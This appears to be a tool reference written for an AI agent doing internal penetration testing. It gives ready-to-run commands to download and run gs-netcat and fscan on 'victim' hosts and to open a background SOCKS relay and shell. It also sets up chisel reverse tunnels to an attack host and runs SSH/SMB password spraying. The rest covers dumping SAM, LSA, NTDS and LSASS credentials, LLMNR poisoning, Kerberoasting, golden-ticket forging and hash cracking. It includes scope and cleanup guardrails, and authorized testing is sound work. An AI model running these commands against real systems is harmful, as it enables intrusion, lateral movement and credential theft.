---
name: tool_reference
description: Tool sources, deployment prerequisites, optional routing and usage reference after an internal assessment action has been selected
---

# Tool Reference

## Tool Deployment

### gs-netcat

| OS | URL |
|----|-----|
| Linux | https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 |
| Windows | Use an operator-approved Windows build with verified provenance; no default binary source is configured |

**Linux deploy:**
```
curl -fsSL -o /var/tmp/gs https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-x86_64 && chmod +x /var/tmp/gs
```

**Windows deployment:** only use an existing approved binary with known source
and integrity information. If unavailable, record the tool limitation and use
verified existing access; do not download and execute an arbitrary binary.

**Common usage:**
- Interactive shell listener: `./gs -l -s <KEY> -i`
- Connect to shell: `./gs -s <KEY> -i`
- SOCKS relay (victim): `./gs -l -D -s <KEY> -S`
- SOCKS client (attack host): `./gs -s <KEY> -p <PORT>`
- Port forwarding requires matching peer-side destination configuration; `-p` takes one port, not an SSH-style `local:host:remote` tuple. Confirm the peer configuration using the [gs-netcat manual](https://www.thc.org/gs-netcat.1.html) before selecting client options.

### fscan

| OS | URL |
|----|-----|
| Linux | https://github.com/shadow1ng/fscan/releases/download/1.8.4/fscan |
| Windows | https://github.com/shadow1ng/fscan/releases/download/1.8.4/fscan.exe |

**Linux deploy:**
```
curl -fsSL -o /var/tmp/fs https://github.com/shadow1ng/fscan/releases/download/1.8.4/fscan && chmod +x /var/tmp/fs
```

**Windows deploy:**
```
Invoke-WebRequest -Uri "https://github.com/shadow1ng/fscan/releases/download/1.8.4/fscan.exe" -OutFile "C:\Windows\Temp\fs.exe"
```

**Common usage:**
- Full scan: `/var/tmp/fs -h <SUBNET/CIDR> -p 21,22,80,135,139,443,445,1433,3306,3389,5432,5985,6379,8080 -o /var/tmp/result.txt`
- SSH spray: `/var/tmp/fs -m ssh -h <SUBNET/CIDR> -userf /var/tmp/u -pwdf /var/tmp/p -t 20 -o /var/tmp/ssh.txt`
- SMB spray: `/var/tmp/fs -m smb -h <SUBNET/CIDR> -userf /var/tmp/u -pwdf /var/tmp/p -t 20 -o /var/tmp/smb.txt`
- MS17-010: `/var/tmp/fs -m ms17010 -h <SUBNET/CIDR> -o /var/tmp/ms17.txt`
- Combined scan + spray: `/var/tmp/fs -h <SUBNET/CIDR> -p 21,22,80,135,139,443,445,1433,3306,3389,5432,5985,6379,8080 -userf /var/tmp/u -pwdf /var/tmp/p -o /var/tmp/full.txt`

**Evidence and cleanup**: preserve the complete output in `/workspace/output/`, verify the transfer, and reference it with `metadata.evidence_files` in the finding. Remove only temporary output files this engagement created, using the recorded cleanup inventory; never delete an existing file just because its name matches an example.

---

## Optional Proxy Setup: gsocket

Follow `internal/methodology` to decide whether a new route is needed. Do not bootstrap a proxy merely because command execution is available or `--socks5` is absent. Reuse provided access; if the operator prohibits deploying another relay, this section does not override that constraint. A new route requires a concrete in-scope destination and verified prerequisites. After a failed attempt, record the failure and continue only through an already verified alternative; retry only if prerequisites have changed.

### Prerequisites (all must be true for the attempt)

- You have command execution on a victim host (shell, webshell, RCE)
- The victim can reach the internet (gsocket relay uses outbound HTTPS on port 443)
- File write + binary execution are viable on the victim
- The engagement permits this change, and an existing route does not meet the need

If any prerequisite is not met, skip the auto-proxy attempt entirely.

### Step-by-step

#### 1. Deploy gs-netcat to victim

Deploy using the commands in the Tool Deployment section above. Check for an existing file before choosing `/var/tmp/gs` (Linux) or `C:\Windows\Temp\gs.exe` (Windows); use a unique path if occupied. Record the dropped binary with `record_internal_event(event_type="artifact_created", ...)` and retain its `resource_id`.

#### 2. Generate key and start SOCKS relay on victim

**Linux:**
```
KEY=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 24) && echo "KEY=$KEY" && nohup /var/tmp/gs -l -D -s $KEY -S > /dev/null 2>&1 &
```

**Windows (cmd):**
```
set KEY=<generate-24-char-key>
start /b C:\Windows\Temp\gs.exe -l -D -s %KEY% -S
```

Save the KEY — you need it on the attack host.

#### 3. Connect from attack host

```
gs-netcat -s <KEY> -p 1088 &
```

This forwards a local port to the SOCKS server established in step 2. The same client command does not turn an unrelated GSocket shell key into a SOCKS proxy. Verify the peer's service mode and route before reporting usable network access.

#### 4. Configure proxychains4

```
echo -e "strict_chain\nproxy_dns\ntcp_read_time_out 15000\ntcp_connect_time_out 8000\n[ProxyList]\nsocks5 127.0.0.1 1088" > /workspace/proxychains-assignment.conf
```

#### 5. Verify

```
proxychains4 -f /workspace/proxychains-assignment.conf nc -zv <INTERNAL_TARGET_IP> 22
```

Choose a unique per-assignment config filename and use it explicitly with `proxychains4 -f <config>` on every routed command. Preserve existing configurations. Once verified, record the route with `record_internal_event(event_type="pivot_verified", ...)`.

### Port assignment

Use port **1088** for auto-proxy to avoid conflicts with user-provided gsocket tunnels (which use 1080 by default). If 1088 is occupied, increment: 1089, 1090, etc.

### Cleanup

Stop only the relay and client processes created by this assignment once no agent depends on them. Remove only the exact deployed binary recorded in the inventory. Restore any modified proxy configuration to its recorded original state. Verify each result and use `record_internal_event` with the matching `resource_id` to record removal or restoration; disclose any unresolved items.

---

## Workspace Paths

| OS | Primary | Fallback |
|----|---------|----------|
| Linux | `/var/tmp/` | `/dev/shm/.k/`, `/tmp/.k/` |
| Windows | `C:\Windows\Temp\` | `%TEMP%\` |

Record deployed files with `record_internal_event` (`artifact_created`) and verified removal with `artifact_removed`, using the returned `resource_id`. The event records cleanup; it does not execute it.

---

## Post-Exploitation Tool Guide

### Impacket Suite (pre-installed)

| Tool | Use when | Command |
|---|---|---|
| `secretsdump` | Dump SAM/NTDS/LSA creds | `impacket-secretsdump user:pass@<ip>` |
| `psexec` | Remote SYSTEM shell (creates service) | `impacket-psexec user:pass@<ip>` |
| `wmiexec` | Remote shell (stealthier) | `impacket-wmiexec user:pass@<ip>` |
| `smbexec` | Remote shell (via share) | `impacket-smbexec user:pass@<ip>` |
| `atexec` | Remote exec via scheduler | `impacket-atexec user:pass@<ip> "cmd"` |
| `GetUserSPNs` | Kerberoast service accounts | `impacket-GetUserSPNs -request user:pass@<dc>` |
| `GetNPUsers` | AS-REP roast | `impacket-GetNPUsers -no-pass corp.local/` |
| `ticketer` | Forge golden/silver tickets | `impacket-ticketer -nthash <hash> user` |
| `getTGT` | Overpass-the-hash | `impacket-getTGT -hashes :<hash> user` |
| `mssqlclient` | MSSQL interaction | `impacket-mssqlclient sa:pass@<ip>` |

### NetExec (pre-installed)

```bash
# Protocol scan + credential test (one command sweeps a subnet)
nxc smb 10.0.0.0/24 -u user -p pass --continue-on-success
nxc winrm 10.0.0.0/24 -u user -p pass
nxc mssql 10.0.0.0/24 -u sa -p pass --local-auth
nxc ssh 10.0.0.0/24 -u root -p root
nxc ldap 10.0.0.1 -u user -p pass --active-directory

# Credential dumping
nxc smb <ip> -u user -p pass --sam      # local SAM
nxc smb <ip> -u user -p pass --lsa      # LSA secrets
nxc smb <ip> -u user -p pass --ntds     # NTDS.dit (DC only)

# Command execution
nxc smb <ip> -u user -p pass -x "whoami"
nxc winrm <ip> -u user -p pass -x "net user"

# Pass-the-Hash
nxc smb <cidr> -u admin -H <ntlm_hash> --local-auth
```

### evil-winrm (pre-installed)

```bash
# Interactive WinRM shell
evil-winrm -i <ip> -u user -p pass
evil-winrm -i <ip> -u user -H <ntlm_hash>

# In-session commands
# upload /local/file.exe
# download C:\\temp\\data.txt /workspace/output/
# menu (show available commands)
```

### responder (pre-installed)

```bash
# Poison LLMNR/NBT-NS/mDNS on the foothold's segment
sudo responder -I <interface> -dwv
# Captures NTLMv2 hashes when other hosts try to resolve names
# Crack: hashcat -m 5600 hashes.txt rockyou.txt
```

### fscan (pre-installed)

```bash
# Fast internal scanner (comprehensive)
fscan -h 10.0.0.0/24

# With SOCKS5 proxy
fscan -h 10.0.0.0/24 -socks5 127.0.0.1:1088

# Specific services only
fscan -h 10.0.0.0/24 -p 22,80,445,3306,3389,6379
```

### chisel (pre-installed)

```bash
# Reverse SOCKS tunnel (compromised host → attack host)
# Attack host (server):
chisel server -p 8080 --reverse
# Compromised host (client):
chisel client <attack_ip>:8080 R:socks

# Port forward
chisel client <attack_ip>:8080 R:3389:10.0.0.50:3389
```

### pypykatz (pre-installed)

```bash
# Parse LSASS dump offline
pypykatz lsa minidump /workspace/output/lsass.dmp

# Parse registry hives
pypykatz registry --sam sam.save --system system.save
```

### john / hashcat (pre-installed)

```bash
# NTLM
hashcat -m 1000 hashes.txt rockyou.txt
# NTLMv2 (from responder)
hashcat -m 5600 hashes.txt rockyou.txt
# Kerberoast
hashcat -m 13100 hashes.txt rockyou.txt
# AS-REP
hashcat -m 18200 hashes.txt rockyou.txt
# bcrypt
hashcat -m 3200 hashes.txt rockyou.txt
```

### Payload Binaries (pre-staged)

Located in `/home/pentester/tools/payloads/` on the sandbox:
- `gs-netcat_linux_amd64` / `gs-netcat_linux_arm64` — deploy to Linux victims
- `fscan_linux_amd64` / `fscan_linux_arm64` — deploy for internal scanning
- `fscan_windows_amd64.exe` — deploy to Windows victims
